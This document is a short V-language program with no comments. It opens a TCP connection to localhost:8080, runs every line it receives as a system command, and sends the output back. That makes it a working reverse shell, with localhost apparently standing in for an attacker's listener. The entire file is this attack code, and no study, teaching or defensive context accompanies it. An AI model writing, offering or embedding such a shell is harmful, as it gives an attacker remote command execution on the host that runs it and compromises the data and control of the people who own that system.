module main

import net
import io
import os

fn exec(path string) string {
        mut out := ''
        mut line := ''
        mut cmd := os.Command{
                path: path
        }
        cmd.start() or { panic(err) }

        for {
                line = cmd.read_line()
                out += line + '\n'
                if cmd.eof {
                        return out
                }
        }
        return out
}

fn main() {
        mut conn := net.dial_tcp('localhost:8080') ?
        mut reader := io.new_buffered_reader(reader: conn)
        for {
                result := reader.read_line() or { return }
                conn.write_string(exec(result) + '\n') or { return }
        }
}
